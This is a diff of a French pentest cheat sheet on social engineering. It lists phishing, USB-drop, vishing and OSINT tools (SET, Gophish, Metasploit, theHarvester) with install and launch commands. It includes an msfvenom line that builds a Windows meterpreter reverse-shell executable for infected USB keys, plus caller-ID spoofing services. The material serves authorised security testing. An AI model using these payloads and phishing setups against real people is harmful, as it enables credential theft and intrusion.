@@ -1,89 +1,84 @@
-# Couche 8 (Social Engineering) – Attaques et Outils
+# Couche 8 – Ingénierie Sociale
 
-**Version Testée :**
-- Social-Engineer Toolkit (SET) 8.x
-- Gophish 0.11.x
-- King Phisher 1.14.x
+## 1. Types d’attaques d’ingénierie sociale
 
-**Description :**  
-Ce document recense les outils et attaques disponibles pour la couche Social Engineering du modèle OSI.  
-Cette couche s'appuie sur la manipulation psychologique et la tromperie pour obtenir des informations sensibles ou compromettre des systèmes.  
-Les outils présentés permettent de lancer des campagnes de phishing, de cloner des sites web, de générer des payloads malveillants ou de simuler des attaques d'ingénierie sociale.  
+- **Phishing**  
+  Le plus courant : tromper la cible pour obtenir des identifiants ou lui faire télécharger un malware, via des emails, des sites web contrefaits, etc.
 
----
+- **USB Drop**  
+  Déposer des clés USB infectées sur le lieu de travail pour pousser quelqu’un à les brancher.
 
-### Outil: Social-Engineer Toolkit (SET)
-**Description :**  
-SET est un framework complet pour réaliser des attaques d'ingénierie sociale, telles que le phishing, le spear-phishing, la création de sites clones et la génération de payloads.
+- **Vishing/Spear phishing**  
+  Ingénierie sociale par téléphone, ou campagne ciblée très personnalisée.
 
-#### Attaque: Phishing / Credential Harvester
-*Détails de l'attaque :*  
-Cloner un site web afin de capturer les identifiants des utilisateurs lorsqu'ils se connectent.
-
-###### Commande: Lancer SET pour Credential Harvester
-```bash
-setoolkit
-```
-Détails :
-- Dans SET, sélectionnez "Social Engineering Attacks" → "Website Attack Vectors" → "Credential Harvester Attack".
-- Suivez les instructions pour cloner un site et récupérer les identifiants.
-
-#### Attaque: Envoi de mass mail de phishing
-*Détails de l'attaque :*  
-Utiliser SET pour envoyer des e-mails de phishing en masse afin de tromper les destinataires et collecter leurs informations.
-
-###### Commande: Lancer SET pour Mass Mailer Attack
-```bash
-setoolkit --mass-mailer
-```
-Détails :
-- Configurez les paramètres d'envoi, y compris l'expéditeur, le contenu et la liste de destinataires.
+- **Collecte d’information (OSINT)**  
+  Rassembler un maximum de données sur la cible pour préparer une attaque plus crédible.
 
 ---
 
-### Outil: Gophish
-**Description :**  
-Gophish est une plateforme open source de phishing qui permet de créer et de gérer des campagnes de phishing de manière centralisée.
+## 2. Outils et méthodes
 
-#### Attaque: Campagne de phishing
-*Détails de l'attaque :*  
-Créer et lancer une campagne de phishing ciblée pour récolter des informations sensibles.
+### ⚡ Attaque : Phishing
 
-###### Commande: Lancer Gophish (serveur intégré)
-```bash
-./gophish
-```
-Détails :
-- Lancez l'interface web de Gophish, configurez votre campagne et surveillez les résultats.
+#### Outil : **SET (Social Engineering Toolkit)**
+- **Description** : Générateur d’attaques d’ingénierie sociale très complet (emails, sites de phishing, payloads…).
+- **Pourquoi l’utiliser** :  
+  - Scénarios automatisés, prise en main rapide
+- **Installation** :  
+  - `sudo apt install set` ou `git clone https://github.com/trustedsec/social-engineer-toolkit.git`
+- **Commande** :  
+  - `sudo setoolkit`
+- **Utilisation** : Menu interactif pour choisir le type de phishing.
 
----
-
-### Outil: King Phisher
-**Description :**  
-King Phisher est un outil de simulation de phishing qui permet de tester la sensibilisation aux attaques de phishing au sein d'une organisation.
-
-#### Attaque: Simulation de phishing avancée
-*Détails de l'attaque :*  
-Simuler une attaque de phishing pour évaluer la vulnérabilité des utilisateurs et améliorer la formation.
-
-###### Commande: Lancer King Phisher Client
-```bash
-king-phisher
-```
-Détails :
-- Utilisez l'interface graphique pour configurer et lancer une campagne de phishing simulée.
+#### Outil : **Gophish**
+- **Description** : Plateforme open-source pour des campagnes de phishing à grande échelle.
+- **Installation** :  
+  - Voir [getgophish.com](https://getgophish.com/)
+- **Commande** :  
+  - `./gophish`
 
 ---
 
-## Précautions Légales & Disclaimer
-**Attention :**  
-L'utilisation de ces outils et techniques d'ingénierie sociale doit être réalisée dans un cadre légal et uniquement à des fins de tests autorisés. Toute utilisation malveillante est strictement interdite.
+### ⚡ Attaque : USB Drop
+
+#### Outil : **Metasploit**
+- **Description** : Générer des payloads pour infecter des clés USB (ex : reverse shell, meterpreter…).
+- **Installation** :  
+  - `sudo apt install metasploit-framework`
+- **Commandes** :  
+  - Générer un payload Windows :  
+    - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe -o shell.exe`
+  - Copier `shell.exe` sur la clé USB.
+- **Note** : Pour test sur un environnement isolé uniquement !
 
 ---
 
-## Références & Ressources
-- [Social-Engineer Toolkit GitHub](https://github.com/trustedsec/social-engineer-toolkit)
-- [Gophish Project](https://getgophish.com/)
-- [King Phisher GitHub](https://github.com/securestate/king-phisher)
-- [OWASP Phishing](https://owasp.org/www-community/attacks/Phishing)
-```
+### ⚡ Attaque : Vishing
+
+#### Outil : **SpoofCard / SpoofTel** (services payants, usage légal strict)
+- **Description** : Permet de falsifier l’identifiant de l’appelant lors d’une attaque par téléphone.
+
+#### Outil : **Twilio (API)**
+- **Description** : Pour automatiser des appels/SMS dans le cadre de tests autorisés.
+
+---
+
+### ⚡ Attaque : OSINT
+
+#### Outil : **theHarvester**
+- **Description** : Collecte emails, sous-domaines, noms sur diverses sources publiques.
+- **Installation** :  
+  - `sudo apt install theharvester`
+- **Commande** :  
+  - `theharvester -d [domaine cible] -b google,bing,linkedin`
+
+#### Outil : **Maltego**
+- **Description** : Cartographie graphique de données (relations, emails, noms…)
+- **Installation** :  
+  - Sur [maltego.com](https://www.maltego.com/)
+
+---
+
+## 3. Contribution
+
+> Expliquez chaque scénario d’attaque sociale, détaillez les outils et partagez des astuces pour la sensibilisation.
